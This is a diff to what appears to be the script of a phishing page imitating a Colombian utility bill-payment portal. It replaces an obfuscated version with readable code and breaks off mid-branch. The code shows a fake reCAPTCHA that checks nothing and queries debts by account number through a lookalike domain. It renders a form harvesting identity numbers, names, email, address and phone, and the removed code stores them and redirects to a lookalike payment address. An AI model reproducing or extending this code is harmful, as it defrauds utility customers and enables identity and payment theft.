@@ -1,1 +1,160 @@
-const _0x42e5f0=_0x477b;(function(_0x21f3ec,_0x6f082e){const _0x3fa01c=_0x477b,_0x444d75=_0x21f3ec();while(!![]){try{const _0x5e28cf=-parseInt(_0x3fa01c(0x2d8))/(0x5*0x209+0xdc+-0xb08)*(-parseInt(_0x3fa01c(0x2df))/(-0x1*-0xe71+0x2*-0x107f+0x128f))+parseInt(_0x3fa01c(0x2c7))/(-0xf*0x215+-0x1*0x6d5+0x2613)+parseInt(_0x3fa01c(0x1eb))/(0x49*-0x2f+-0x4*0xd1+0x10af)*(-parseInt(_0x3fa01c(0x2f3))/(-0x21fe+-0xd11+-0x20c*-0x17))+-parseInt(_0x3fa01c(0x2fc))/(0x29*-0x65+0x95*-0x3a+-0x7*-0x723)+parseInt(_0x3fa01c(0x2cb))/(-0x7e1*0x1+0x9d*0x14+-0x117*0x4)+-parseInt(_0x3fa01c(0x26b))/(0x1be0+-0x182*-0x18+-0x4008)+parseInt(_0x3fa01c(0x22d))/(-0x49*0x58+0x1205+0xb6*0xa);if(_0x5e28cf===_0x6f082e)break;else _0x444d75['push'](_0x444d75['shift']());}catch(_0xe5c28c){_0x444d75['push'](_0x444d75['shift']());}}}(_0x4f0d,-0x95756*0x1+0xa3*0x137b+0x42979*0x1));function _0x477b(_0x2bc1b9,_0x3d4f44){_0x2bc1b9=_0x2bc1b9-(0x7*0x517+0x5c9+-0x279d);const _0x3a9637=_0x4f0d();let _0x5e63fe=_0x3a9637[_0x2bc1b9];return _0x5e63fe;}const hamburgerBtn=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x253)+'tn'),hamburgerBtnDesktop=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x253)+_0x42e5f0(0x337)),sidebar=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x299)),toggleSidebar=()=>{const _0x206672=_0x42e5f0,_0x5ddc6a={'FDZWT':function(_0x5c7bfe,_0x2c989c){return _0x5c7bfe<=_0x2c989c;},'VtiMd':_0x206672(0x27b)+'n','kJVPJ':_0x206672(0x29a)};_0x5ddc6a[_0x206672(0x2d5)](window[_0x206672(0x322)],0xf*-0x15d+-0x1f*-0x8d+0x660)?sidebar[_0x206672(0x310)][_0x206672(0x215)](_0x5ddc6a[_0x206672(0x2f6)]):sidebar[_0x206672(0x310)][_0x206672(0x215)](_0x5ddc6a[_0x206672(0x26d)]);};if(hamburgerBtn)hamburgerBtn[_0x42e5f0(0x2ef)+_0x42e5f0(0x21a)](_0x42e5f0(0x32c),toggleSidebar);if(hamburgerBtnDesktop)hamburgerBtnDesktop[_0x42e5f0(0x2ef)+_0x42e5f0(0x21a)](_0x42e5f0(0x32c),toggleSidebar);const checkboxContainer=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x316)+_0x42e5f0(0x1f6)),fakeCheckbox=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x334)+'ox'),spinner=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x2f4)),checkmark=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x30d));let isChecked=![];checkboxContainer[_0x42e5f0(0x2ef)+_0x42e5f0(0x21a)](_0x42e5f0(0x32c),()=>{const _0x29c3e0=_0x42e5f0,_0x3c6749={'qJhTN':_0x29c3e0(0x279),'IfMIk':_0x29c3e0(0x31e),'HdIYc':function(_0x4f5038,_0x5c3ed4,_0x2e81d7){return _0x4f5038(_0x5c3ed4,_0x2e81d7);}};if(isChecked)return;fakeCheckbox[_0x29c3e0(0x2f5)][_0x29c3e0(0x273)]=_0x3c6749[_0x29c3e0(0x23c)],spinner[_0x29c3e0(0x2f5)][_0x29c3e0(0x273)]=_0x3c6749[_0x29c3e0(0x24f)],_0x3c6749[_0x29c3e0(0x2b4)](setTimeout,()=>{const _0x566040=_0x29c3e0;spinner[_0x566040(0x2f5)][_0x566040(0x273)]=_0x3c6749[_0x566040(0x23c)],checkmark[_0x566040(0x2f5)][_0x566040(0x273)]=_0x3c6749[_0x566040(0x24f)],isChecked=!![];},0xb*0x2f6+-0x284+0x22*-0xbf);});const btnPagar=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x281)),whitePanel=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x28b)),originalTitleStrip=document[_0x42e5f0(0x21f)+_0x42e5f0(0x332)](_0x42e5f0(0x27e)+_0x42e5f0(0x338)),inputsValidar=document[_0x42e5f0(0x1f8)+_0x42e5f0(0x200)](_0x42e5f0(0x1f7)+_0x42e5f0(0x1d4));function _0x4f0d(){const _0x39c7ee=['n>\x0a\x20\x20\x20\x20\x20\x20\x20','payment-ca','#\x22>autoriz','put\x20type=\x22','><div\x20clas','n\x20<span>*<','correo','n\x20valor\x20en','l</div><di','</button><','div>\x0a\x20\x20\x20\x20\x20','></label><','iento\x20de\x20D','input\x20type','umId\x22></di','\x20\x20\x20\x20\x20\x20\x20\x20\x20<','qfNQy','OaLDq','ado\x20el\x20tra','acuerdo\x20co','ce-label\x22>','HdIYc','on\x20btn-blu','bel\x22>Direc','group\x22><la','card-actio','\x22\x20onclick=','nvoice-lab','der-contai','w\x22>\x0a\x20\x20\x20\x20\x20\x20','un\x20abono</','\x20\x20\x20\x20\x20\x20\x20\x20<b','class=\x22btn','/label><in','ss=\x22pay-ca','oice-input','bel><input','reo\x20electr','class=\x22big','\x20id=\x22celul','68007osFNCu','\x20<a\x20href=\x22','\x22text\x22\x20cla','ha\x20leído,\x20','1255527Adazck','owered\x20By\x20','v\x20class=\x22p','\x22guardarYR','oice-foote','<label\x20cla','abono','select\x20cla','iv>\x0a\x20\x20\x20\x20\x20\x20','randing\x22>P','FDZWT','tamiento\x20d','ield\x22\x20plac','5WHoOsT','/option></','19.530</di','cación\x20<sp','el\x22>Tipo\x20d','invoice-in','=\x22invoice-','155810mjfQzw','div\x20class=','an>*</span','fono\x20celul','rid\x22>\x0a\x20\x20\x20\x20','abel\x22>Apel','tton\x20class','\x22>Política','r\x22>\x0a\x20\x20\x20\x20\x20\x20','s=\x22pay-car','d-title\x22>V','nales.</a>','</label><i','t\x22\x20class=\x22','cel\x22>CANCE','ctrLr','addEventLi','iende\x20que\x20','yment-card','e-label\x22>N','2088830HVyhTj','spinner','style','VtiMd','ice-header','-field\x22\x20id','No.\x20de\x20ide','v\x20class=\x22i','GnGDE','2903136UittZF','tObIL','href','\x20de\x20Tratam','ar\x22></div>','-group\x22><l','ion\x20value=','bRWGS','/div></div','eader\x22><h3','30\x27,\x20\x27mens','eholder=\x22#','id=\x22nombre','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20','ner\x22><div\x20','ual\x27)\x22>PAG','s=\x22invoice','checkmark','</span></d','</span></l','classList','><button\x20c','-card-acti','#########\x22','id=\x22correo','><option>S','checkboxCo','v><button\x20','=\x22full-loa','o\x20requerid','invoice-la','tton></div','n>Al\x20marca','s=\x22btn-can','block','=\x22footer-b','BUYPW','d=\x22tipoId\x22','innerWidth','>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','\x20\x20\x20<div\x20cl','e\x20sus\x20dato','y-card-tit','html','ónico\x20<spa','oup\x22><labe','innerHTML','Deuda\x20Tota','click','cture.com.','sSLOH','\x20class=\x22pa','TKhfE','nput\x20type=','ById','e\x20continua','fakeCheckb','E\x20SU\x20FACTU','click=\x22gua','tnDesktop','tleStrip','le\x22>Hacer\x20','ULDGs','es</div><d','lass=\x22invo','amPur','floor','LAR</butto','Ingrese\x20el','idador','pay-input-','s\x22></div>\x0a','div><input','ABONAR</bu','nvoice-inp','e\x20identifi','dirigir','s.portalfa','a\x20Marca\x20de','e-input-gr','put-group\x22','direccion','\x22invoice-f','ption\x20valu','select></d','n\x22></div>\x0a','trim','=\x22payment-','roup\x22><lab','nombres','rd-title\x22>','9.530</div','4PLGTuq','terms-chec','xAQuZ','\x20\x20</div>\x0a\x20','value','-loader\x22><','type=\x22chec','\x22invoice-h','ón.','\x20\x20\x20\x20\x20\x20\x20<di','n\x20btn-teal','ntainer','.input-val','querySelec','eld\x22\x20id=\x22n','YzgNk','<a\x20href=\x22#','no\x22\x20placeh','/option><o','bonar','\x20diligenci','torAll','ay-card-am','0.000\x22><bu','ount\x22>$\x2071','ombres\x20<sp','\x20\x20\x20</div>\x0a','la,\x20se\x20ent','e-dark\x22\x20on','719530\x27,\x20\x27','ndica\x20camp','es</a>\x20de\x20','\x20type=\x22tex','UxjWr','abel><inpu','bel\x20class=','ass=\x22invoi','\x22email\x22\x20cl','><label\x20cl','n-blue-lig','ción\x20<span','older=\x22$00','toggle','k\x22><input\x20','ice-form-g','utton\x20clas','location','stener','xgfMG','\x27abono\x27)\x22>','=\x22required','aceptado\x20y','getElement','jfofq','ar\x20<span>*','inputAbono','mount\x22>$\x207','text\x22\x20clas','rds-grid\x22>','total\x27)\x22>P','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','YRedirigir','\x20\x20\x20\x20\x20\x20<div','o</div>\x0a\x20\x20','dadanía</o','card\x22><div','8096886rhLMUa','lass=\x22btn-','nvoice-vie','\x22NIT\x22>NIT<','\x20</div>\x0a\x20\x20','ce-field\x22\x20','ht\x22\x20onclic','AR\x20MES</bu','datosFactu','random','kbox\x22><spa','\x20Estela</d','iv\x20class=\x22','k=\x22guardar','\x22><h3>PAGU','qJhTN','=\x22direccio','NES</h3></','forEach','el\x20class=\x22','\x20\x20\x20\x20<div\x20c','Facture\x20un','eleccione<','apellidos','>TÉRMINOS\x20','n\x20nuestra\x20','r\x20la\x20casil','d=\x22apellid','pay-card-a','abel\x22>Telé','t\x20type=\x22te','invoice-fi','xt\x22\x20class=','RA</h3></d','IfMIk','class=\x22pay','v>\x0a\x20\x20\x20\x20\x20\x20\x20','e-field\x22\x20i','hamburgerB','=\x22text\x22\x20cl','pwELj','alor\x20del\x20m','ntificació','QvUQZ','stringify','s\x20personal','STLCM','abel\x20class','GFmjq','guardarYRe','tipoId','</div>','edirigir(\x27','Y\x20CONDICIO','=\x22inputAbo','e\x20los\x20dato','\x20valor\x20a\x20a','\x20ingrese\x20u','atos\x20Perso','ula\x20de\x20Ciu','ment-card\x22','NMvol','929016xVzsBP','/span></la','kJVPJ','=\x22btn-card','\x22invoice-l','portalpago','n>*</span>','rdarYRedir','display','Por\x20favor,','\x22><div\x20cla','\x20\x20\x20\x20\x20<div\x20','numId','l\x20class=\x22i','none','class=\x22inv','mobile-ope','-note\x22>*\x20I','igir(\x277195','originalTi','\x20\x20\x20\x20\x20\x20\x20\x20<d','-action\x20bt','btnPagar','(\x27abono\x27,\x20','celular','setItem','<div\x20class','181.51.89.','os\x22></div>','ption><opt','\x20NIC\x20o\x20Cup','\x20\x20<div\x20cla','whitePanel','lZwlP','\x22></div>\x0a\x20','lidos\x20<spa','/div>\x0a\x20\x20\x20\x20','amount\x22\x20id','es\x20antes\x20d','e=\x22CC\x22>Céd','ce-input-g','>*</span><','ice-input-','label\x22>Cor','AGAR\x20TOTAL','ut-group\x22>','sidebar','hidden','XiyVw','ss=\x22invoic','eLXfE','EUwll'];_0x4f0d=function(){return _0x39c7ee;};return _0x4f0d();}btnPagar[_0x42e5f0(0x2ef)+_0x42e5f0(0x21a)](_0x42e5f0(0x32c),()=>{const _0x4f1f37=_0x42e5f0,_0x3221cf={'xAQuZ':function(_0x3c1384,_0x2f09f1){return _0x3c1384!==_0x2f09f1;},'XiyVw':function(_0x152794,_0x287bd2){return _0x152794(_0x287bd2);},'bRWGS':_0x4f1f37(0x274)+_0x4f1f37(0x266)+_0x4f1f37(0x2a6)+_0x4f1f37(0x289)+_0x4f1f37(0x1f3),'ULDGs':_0x4f1f37(0x279),'amPur':function(_0x7872cd,_0x4e8708,_0x2668db){return _0x7872cd(_0x4e8708,_0x2668db);}};let _0x31f24e=![];inputsValidar[_0x4f1f37(0x23f)](_0x299025=>{const _0x3869ee=_0x4f1f37;if(_0x3221cf[_0x3869ee(0x1ed)](_0x299025[_0x3869ee(0x1ef)][_0x3869ee(0x1e5)](),''))_0x31f24e=!![];});if(!_0x31f24e){_0x3221cf[_0x4f1f37(0x29b)](alert,_0x3221cf[_0x4f1f37(0x303)]);return;}originalTitleStrip[_0x4f1f37(0x2f5)][_0x4f1f37(0x273)]=_0x3221cf[_0x4f1f37(0x1cd)],whitePanel[_0x4f1f37(0x32a)]='',whitePanel[_0x4f1f37(0x32a)]=_0x4f1f37(0x285)+_0x4f1f37(0x318)+_0x4f1f37(0x2bb)+_0x4f1f37(0x30a)+_0x4f1f37(0x2c5)+_0x4f1f37(0x1f0)+_0x4f1f37(0x304)+'>',_0x3221cf[_0x4f1f37(0x1d0)](setTimeout,()=>{const _0x882445=_0x4f1f37;whitePanel[_0x882445(0x32a)]=_0x882445(0x309)+_0x882445(0x1f4)+_0x882445(0x2fa)+_0x882445(0x22f)+_0x882445(0x2bc)+_0x882445(0x227)+_0x882445(0x241)+_0x882445(0x1cf)+_0x882445(0x2f7)+_0x882445(0x23b)+_0x882445(0x335)+_0x882445(0x24e)+_0x882445(0x2d3)+_0x882445(0x227)+_0x882445(0x241)+_0x882445(0x1cf)+_0x882445(0x217)+_0x882445(0x2e3)+_0x882445(0x227)+_0x882445(0x227)+_0x882445(0x285)+_0x882445(0x21d)+_0x882445(0x27c)+_0x882445(0x209)+_0x882445(0x319)+_0x882445(0x22a)+_0x882445(0x227)+_0x882445(0x227)+_0x882445(0x28a)+_0x882445(0x29c)+_0x882445(0x1de)+_0x882445(0x329)+_0x882445(0x278)+_0x882445(0x2ba)+_0x882445(0x2dc)+_0x882445(0x1da)+_0x882445(0x2db)+_0x882445(0x2e1)+_0x882445(0x2aa)+_0x882445(0x2d2)+_0x882445(0x29c)+_0x882445(0x252)+_0x882445(0x321)+_0x882445(0x315)+_0x882445(0x243)+_0x882445(0x1fd)+_0x882445(0x1e2)+_0x882445(0x292)+_0x882445(0x268)+_0x882445(0x22b)+_0x882445(0x288)+_0x882445(0x302)+_0x882445(0x230)+_0x882445(0x2d9)+_0x882445(0x1e3)+_0x882445(0x2d3)+_0x882445(0x227)+_0x882445(0x27f)+_0x882445(0x239)+_0x882445(0x2dd)+_0x882445(0x1df)+_0x882445(0x211)+_0x882445(0x20f)+_0x882445(0x2b3)+_0x882445(0x2f9)+_0x882445(0x257)+_0x882445(0x2a4)+_0x882445(0x26c)+_0x882445(0x2c3)+_0x882445(0x20b)+_0x882445(0x2ec)+_0x882445(0x24c)+_0x882445(0x1f9)+_0x882445(0x2ad)+_0x882445(0x251)+_0x882445(0x227)+_0x882445(0x1f4)+_0x882445(0x2fa)+_0x882445(0x1d9)+_0x882445(0x298)+_0x882445(0x2d0)+_0x882445(0x29c)+_0x882445(0x2f2)+_0x882445(0x204)+_0x882445(0x2e1)+_0x882445(0x2aa)+_0x882445(0x2ac)+_0x882445(0x254)+_0x882445(0x20f)+_0x882445(0x232)+_0x882445(0x308)+_0x882445(0x1d6)+_0x882445(0x227)+_0x882445(0x227)+_0x882445(0x241)+_0x882445(0x1cf)+_0x882445(0x295)+_0x882445(0x2b7)+_0x882445(0x20e)+_0x882445(0x26f)+(_0x882445(0x2e4)+_0x882445(0x28e)+_0x882445(0x271)+_0x882445(0x2eb)+_0x882445(0x331)+_0x882445(0x2c9)+_0x882445(0x29c)+_0x882445(0x252)+_0x882445(0x248)+_0x882445(0x287)+_0x882445(0x309)+_0x882445(0x227)+_0x882445(0x276)+_0x882445(0x27a)+_0x882445(0x2c2)+_0x882445(0x301)+_0x882445(0x25c)+_0x882445(0x2de)+_0x882445(0x296)+_0x882445(0x2c4)+_0x882445(0x328)+_0x882445(0x271)+_0x882445(0x2eb)+_0x882445(0x331)+_0x882445(0x210)+_0x882445(0x20f)+_0x882445(0x232)+_0x882445(0x314)+_0x882445(0x28d)+_0x882445(0x227)+_0x882445(0x227)+_0x882445(0x324)+_0x882445(0x20f)+_0x882445(0x293)+_0x882445(0x1e7)+_0x882445(0x240)+_0x882445(0x31a)+_0x882445(0x2b6)+_0x882445(0x213)+_0x882445(0x294)+_0x882445(0x2c0)+_0x882445(0x2a2)+_0x882445(0x224)+_0x882445(0x30c)+_0x882445(0x2f8)+_0x882445(0x23d)+_0x882445(0x1e4)+_0x882445(0x227)+_0x882445(0x227)+_0x882445(0x241)+_0x882445(0x1cf)+_0x882445(0x295)+_0x882445(0x2b7)+_0x882445(0x20e)+_0x882445(0x26f)+_0x882445(0x24a)+_0x882445(0x2e2)+_0x882445(0x221)+_0x882445(0x30f)+_0x882445(0x20d)+_0x882445(0x24b)+_0x882445(0x24d)+_0x882445(0x1e1)+_0x882445(0x2d7)+_0x882445(0x307)+_0x882445(0x313)+_0x882445(0x2c6)+_0x882445(0x300)+_0x882445(0x309)+_0x882445(0x227)+_0x882445(0x231)+_0x882445(0x227)+_0x882445(0x27f)+_0x882445(0x239)+_0x882445(0x2a0)+_0x882445(0x225)+_0x882445(0x309)+_0x882445(0x227)+_0x882445(0x276)+_0x882445(0x250)+_0x882445(0x269)+_0x882445(0x2a3)+_0x882445(0x2e8)+_0x882445(0x2e9)+_0x882445(0x256)+_0x882445(0x1ce)+_0x882445(0x239)+_0x882445(0x249)+_0x882445(0x223)+_0x882445(0x2da)+_0x882445(0x317)+_0x882445(0x2bf)+_0x882445(0x312)+_0x882445(0x2b5)+_0x882445(0x207)+_0x882445(0x336)+_0x882445(0x272)+_0x882445(0x27d)+_0x882445(0x306)+_0x882445(0x30b))+(_0x882445(0x234)+_0x882445(0x31b)+_0x882445(0x323)+_0x882445(0x227)+_0x882445(0x229)+_0x882445(0x32f)+_0x882445(0x2f1)+_0x882445(0x275)+_0x882445(0x2c1)+_0x882445(0x1e9)+_0x882445(0x32b)+_0x882445(0x2a7)+_0x882445(0x2cd)+_0x882445(0x201)+_0x882445(0x203)+_0x882445(0x1ea)+_0x882445(0x311)+_0x882445(0x22e)+_0x882445(0x2b8)+_0x882445(0x1f5)+_0x882445(0x2b9)+_0x882445(0x2ce)+_0x882445(0x261)+_0x882445(0x208)+_0x882445(0x226)+_0x882445(0x297)+_0x882445(0x2a8)+_0x882445(0x28f)+_0x882445(0x227)+_0x882445(0x227)+_0x882445(0x285)+_0x882445(0x1e6)+_0x882445(0x22c)+_0x882445(0x32f)+_0x882445(0x326)+_0x882445(0x339)+_0x882445(0x2bd)+_0x882445(0x1d7)+_0x882445(0x20b)+_0x882445(0x2ec)+_0x882445(0x1d5)+_0x882445(0x290)+_0x882445(0x263)+_0x882445(0x1fc)+_0x882445(0x214)+_0x882445(0x202)+_0x882445(0x2e5)+_0x882445(0x26e)+_0x882445(0x280)+_0x882445(0x212)+_0x882445(0x233)+_0x882445(0x23a)+_0x882445(0x228)+_0x882445(0x282)+_0x882445(0x21c)+_0x882445(0x1d8)+_0x882445(0x31b)+_0x882445(0x323)+_0x882445(0x227)+_0x882445(0x1ee)+_0x882445(0x227)+_0x882445(0x2ae)+_0x882445(0x2e0)+_0x882445(0x1f2)+_0x882445(0x305)+_0x882445(0x245)+_0x882445(0x262)+_0x882445(0x23e)+_0x882445(0x2a9)+_0x882445(0x227)+_0x882445(0x276)+_0x882445(0x27a)+_0x882445(0x2cf)+_0x882445(0x2e7)+_0x882445(0x227)+_0x882445(0x27f)+_0x882445(0x239)+_0x882445(0x1ec)+_0x882445(0x216)+_0x882445(0x1f1)+_0x882445(0x237)+_0x882445(0x31c)+_0x882445(0x247)+_0x882445(0x206)+_0x882445(0x2f0)+_0x882445(0x2ca)+_0x882445(0x21e)+_0x882445(0x2c8)+_0x882445(0x2a1)+_0x882445(0x2b1)+_0x882445(0x2d6)+_0x882445(0x325)+_0x882445(0x25a)+_0x882445(0x20a)+_0x882445(0x2b2)+_0x882445(0x246)+_0x882445(0x1fb)+_0x882445(0x2e6)+_0x882445(0x2ff)+_0x882445(0x2ab))+(_0x882445(0x267)+_0x882445(0x2ea)+_0x882445(0x30e)+_0x882445(0x2d3)+_0x882445(0x227)+_0x882445(0x2be)+_0x882445(0x218)+_0x882445(0x31d)+_0x882445(0x2ed)+_0x882445(0x1d2)+_0x882445(0x29f)+_0x882445(0x227)+_0x882445(0x205)+_0x882445(0x227)+_0x882445(0x227)+_0x882445(0x285)+_0x882445(0x31f)+_0x882445(0x2d4)+_0x882445(0x2cc)+_0x882445(0x242)+_0x882445(0x1dd)+_0x882445(0x238)+_0x882445(0x2d3)+_0x882445(0x227)+_0x882445(0x260));},-0x1*-0x77f+0x8*-0x370+0x23a1*0x1);}),window[_0x42e5f0(0x25e)+_0x42e5f0(0x1db)]=function(_0x55bc17,_0x912688){const _0xc49505=_0x42e5f0,_0x2d4d54={'xgfMG':_0xc49505(0x1e8),'GFmjq':_0xc49505(0x244),'QvUQZ':_0xc49505(0x25f),'jfofq':_0xc49505(0x277),'qfNQy':_0xc49505(0x2a5),'lZwlP':_0xc49505(0x1e0),'UxjWr':_0xc49505(0x283),'sSLOH':function(_0x47fa71,_0x44fae2){return _0x47fa71||_0x44fae2;},'TKhfE':function(_0x529e22,_0x287536){return _0x529e22(_0x287536);},'NMvol':_0xc49505(0x274)+_0xc49505(0x1ff)+_0xc49505(0x264)+_0xc49505(0x25a)+_0xc49505(0x291)+_0xc49505(0x333)+'r.','OaLDq':function(_0x46a16a,_0x596f1c){return _0x46a16a===_0x596f1c;},'STLCM':_0xc49505(0x2d1),'eLXfE':_0xc49505(0x222),'YzgNk':_0xc49505(0x1d3)+_0xc49505(0x265)+_0xc49505(0x1fe),'BUYPW':function(_0x4b5ea7,_0xdf83b9){return _0x4b5ea7+_0xdf83b9;},'pwELj':function(_0x11ab27,_0x3c9e56){return _0x11ab27+_0x3c9e56;},'ctrLr':function(_0x1c330e,_0x51bbce){return _0x1c330e*_0x51bbce;},'tObIL':_0xc49505(0x286)+'21','GnGDE':_0xc49505(0x235)+'ra','EUwll':_0xc49505(0x270)+_0xc49505(0x1dc)+_0xc49505(0x32d)+_0xc49505(0x327)},_0x3e37fc=document[_0xc49505(0x21f)+_0xc49505(0x332)](_0x2d4d54[_0xc49505(0x21b)])[_0xc49505(0x1ef)],_0x1d07ba=document[_0xc49505(0x21f)+_0xc49505(0x332)](_0x2d4d54[_0xc49505(0x25d)])[_0xc49505(0x1ef)],_0x5d40d4=document[_0xc49505(0x21f)+_0xc49505(0x332)](_0x2d4d54[_0xc49505(0x258)])[_0xc49505(0x1ef)],_0x441690=document[_0xc49505(0x21f)+_0xc49505(0x332)](_0x2d4d54[_0xc49505(0x220)])[_0xc49505(0x1ef)],_0x2c31ac=document[_0xc49505(0x21f)+_0xc49505(0x332)](_0x2d4d54[_0xc49505(0x2af)])[_0xc49505(0x1ef)],_0x29f66f=document[_0xc49505(0x21f)+_0xc49505(0x332)](_0x2d4d54[_0xc49505(0x28c)])[_0xc49505(0x1ef)],_0x5bcbed=document[_0xc49505(0x21f)+_0xc49505(0x332)](_0x2d4d54[_0xc49505(0x20c)])[_0xc49505(0x1ef)];if(_0x2d4d54[_0xc49505(0x32e)](!_0x3e37fc,!_0x1d07ba)||!_0x441690||!_0x2c31ac){_0x2d4d54[_0xc49505(0x330)](alert,_0x2d4d54[_0xc49505(0x26a)]);return;}let _0x251351=_0x55bc17;if(_0x2d4d54[_0xc49505(0x2b0)](_0x912688,_0x2d4d54[_0xc49505(0x25b)])){const _0x299e7f=document[_0xc49505(0x21f)+_0xc49505(0x332)](_0x2d4d54[_0xc49505(0x29d)])[_0xc49505(0x1ef)];if(!_0x299e7f){_0x2d4d54[_0xc49505(0x330)](alert,_0x2d4d54[_0xc49505(0x1fa)]);return;}_0x251351=_0x299e7f;}const _0x58031b={'nombreCompleto':_0x2d4d54[_0xc49505(0x320)](_0x2d4d54[_0xc49505(0x255)](_0x3e37fc,'\x20'),_0x1d07ba),'tipoId':_0x5d40d4,'numId':_0x441690,'correo':_0x2c31ac,'direccion':_0x29f66f,'celular':_0x5bcbed,'montoPagar':_0x251351,'referencia':Math[_0xc49505(0x1d1)](_0x2d4d54[_0xc49505(0x2ee)](Math[_0xc49505(0x236)](),-0x38c7eef+-0x3a3e35b*0x3+0x146e0a00)),'ip':_0x2d4d54[_0xc49505(0x2fd)]};localStorage[_0xc49505(0x284)](_0x2d4d54[_0xc49505(0x2fb)],JSON[_0xc49505(0x259)](_0x58031b)),window[_0xc49505(0x219)][_0xc49505(0x2fe)]=_0x2d4d54[_0xc49505(0x29e)];};
+// --- 1. Lógica del Menú Hamburguesa ---
+        const hamburgerBtn = document.getElementById('hamburgerBtn');
+        const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
+        const sidebar = document.getElementById('sidebar');
+
+        const toggleSidebar = () => {
+            if (window.innerWidth <= 768) {
+                sidebar.classList.toggle('mobile-open');
+            } else {
+                sidebar.classList.toggle('hidden');
+            }
+        };
+
+        if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
+        if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);
+
+        // --- 2. Lógica del ReCAPTCHA ---
+        const checkboxContainer = document.getElementById('checkboxContainer');
+        const fakeCheckbox = document.getElementById('fakeCheckbox');
+        const spinner = document.getElementById('spinner');
+        const checkmark = document.getElementById('checkmark');
+        let isChecked = false;
+
+        checkboxContainer.addEventListener('click', () => {
+            if(isChecked) return; 
+            fakeCheckbox.style.display = 'none';
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                checkmark.style.display = 'block';
+                isChecked = true;
+            }, 1200);
+        });
+
+        // --- 3. LÓGICA PRINCIPAL DEL ROBOT ---
+        const btnPagar = document.getElementById('btnPagar');
+        const whitePanel = document.getElementById('whitePanel');
+        const originalTitleStrip = document.getElementById('originalTitleStrip');
+        // Capturamos el input que SÍ tiene el ID
+        const inputNic = document.getElementById('inputNicReal');
+
+        btnPagar.addEventListener('click', async () => {
+            
+            // Validación
+            if(!inputNic || inputNic.value.trim() === '') {
+                alert("Por favor, ingrese el NIC.");
+                return;
+            }
+
+            if(!isChecked) {
+                alert("Por favor confirme que no es un robot.");
+                return;
+            }
+
+            // Preparar UI (Loader)
+            originalTitleStrip.style.display = 'none';
+            whitePanel.innerHTML = '';
+            whitePanel.innerHTML = `<div class="full-loader-container"><div class="big-loader"></div></div>`;
+
+            try {
+                // --- PETICIÓN AL ROBOT ---
+                // Aquí llamamos al backend en localhost:4000
+                const resp = await fetch(`https://aire.pagoswebcol.uk/consultar-nic?nic=${inputNic.value}`);
+                const json = await resp.json();
+
+                // Variables para la vista
+                let valorMes = "0";
+                let valorTotal = "0";
+                let nicEncontrado = inputNic.value;
+
+                if (json.data && json.data.deudaTotal && json.data.deudaTotal !== "0") {
+                    valorMes = json.data.valorMes;
+                    valorTotal = json.data.deudaTotal;
+                    // Limpiamos ($ y puntos)
+                    const totalLimpio = valorTotal.replace(/[^\d]/g, '');
+                    
+                    // Renderizamos resultado con datos reales
+                    whitePanel.innerHTML = `
+                    <div class="invoice-view">
+                        <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
+                        <div class="invoice-form-grid">
+                            <div class="required-note">* Indica campo requerido</div>
+                            <div class="invoice-input-group"><label class="invoice-label">Tipo de identificación <span>*</span></label><select class="invoice-field" id="tipoId"><option>Seleccione</option><option value="CC">Cédula de Ciudadanía</option><option value="NIT">NIT</option></select></div>
+                            <div class="invoice-input-group"><label class="invoice-label">No. de identificación <span>*</span></label><input type="text" class="invoice-field" id="numId" value="${nicEncontrado}"></div>
+                            <div class="invoice-input-group"><label class="invoice-label">Nombres <span>*</span></label><input type="text" class="invoice-field" id="nombres"></div>
+                            <div class="invoice-input-group"><label class="invoice-label">Apellidos <span>*</span></label><input type="text" class="invoice-field" id="apellidos"></div>
+                            <div class="invoice-input-group"><label class="invoice-label">Correo electrónico <span>*</span></label><input type="email" class="invoice-field" id="correo"></div>
+                            <div class="invoice-input-group"><label class="invoice-label">Dirección <span>*</span></label><input type="text" class="invoice-field" id="direccion"></div>
+                            <div class="invoice-input-group"><label class="invoice-label">Teléfono celular <span>*</span></label><input type="text" class="invoice-field" placeholder="##########" id="celular"></div>
+                        </div>
+                        <div class="payment-cards-grid">
+                            <div class="payment-card"><div class="pay-card-title">Valor del mes</div><div class="pay-card-amount">$ ${valorMes}</div><button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${totalLimpio}', 'mensual')">PAGAR MES</button></div>
+                            <div class="payment-card"><div class="pay-card-title">Deuda Total</div><div class="pay-card-amount">$ ${valorTotal}</div><button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${totalLimpio}', 'total')">PAGAR TOTAL</button></div>
+                            <div class="payment-card"><div class="pay-card-title">Hacer un abono</div><input type="text" class="pay-input-amount" id="inputAbono" placeholder="$000.000"><button class="btn-card-action btn-blue-light" onclick="guardarYRedirigir('abono', 'abono')">ABONAR</button></div>
+                        </div>
+                        <div class="invoice-header"><h3>TÉRMINOS Y CONDICIONES</h3></div>
+                        <div class="invoice-footer">
+                            <div class="terms-check"><input type="checkbox"><span>Al marcar la casilla, se entiende que ha leído, aceptado y <a href="#">autorizado el tratamiento de sus datos personales</a> de acuerdo con nuestra <a href="#">Política de Tratamiento de Datos Personales.</a></span></div>
+                            <button class="btn-cancel" onclick="location.reload()">CANCELAR</button>
+                        </div>
+                        <div class="footer-branding">Powered By Facture una Marca de Estela</div>
+                    </div>`;
+
+                } else if (json.data && json.data.mensaje === "Al día") {
+                    // CASO NO DEUDA
+                    alert("¡Buenas noticias! Este NIC no tiene facturas pendientes por pagar.");
+                    location.reload();
+                } else {
